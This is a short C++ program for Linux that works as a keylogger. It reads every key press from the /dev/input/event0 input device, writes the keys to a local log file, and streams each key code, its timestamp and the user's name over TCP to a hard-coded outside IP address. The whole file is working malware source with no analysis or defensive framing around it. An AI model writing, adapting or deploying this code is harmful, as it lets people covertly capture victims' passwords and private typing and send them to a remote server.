#include <boost/asio.hpp>
#include <fstream>
#include <iostream>
#include <libevdev-1.0/libevdev/libevdev.h>
#include <string>

namespace asio = boost::asio;
using asio::ip::tcp;

const char *IP_ADDRESS = "52.140.122.91";
const char *PORT = "8686";

struct libevdev *dev;
int fd;
std::ofstream outfile;
tcp::socket *socket_ptr;

void sigint_handler(int signum) {
    std::cout << "\nCtrl + c recieved" << std::endl;
    std::cout << "Closing open files and sockets..." << std::endl;
    outfile.close();
    libevdev_free(dev);
    close(fd);
    socket_ptr->close();
    exit(signum);
}

int main() {

    std::string username = std::getenv("USER");

    asio::io_context io_context;
    tcp::socket socket(io_context);

    // Connect to server
    tcp::resolver resolver(io_context);
    asio::connect(socket, resolver.resolve(IP_ADDRESS, PORT));

    // Send username to server
    asio::write(socket, asio::buffer(username + "\n"));

    // Open the input device
    fd = open("/dev/input/event0", O_RDONLY);
    int rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        std::cerr << "Failed to open device" << std::endl;
        return 1;
    }
    outfile = std::ofstream("log.txt");
    socket_ptr = &socket;

    signal(SIGINT, sigint_handler);

    // Read events from input device
    while (true) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
        if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
            if (ev.type == EV_KEY && ev.value == 1) {
                std::string message = "Key: " + std::to_string(ev.code) +
                                      ", Time: " + std::to_string(ev.time.tv_sec) + "." +
                                      std::to_string(ev.time.tv_usec) + "\n";
                asio::write(socket, asio::buffer(message));
                outfile << message;
                std::flush(outfile);
            }
        }
    }

    return 0;
}
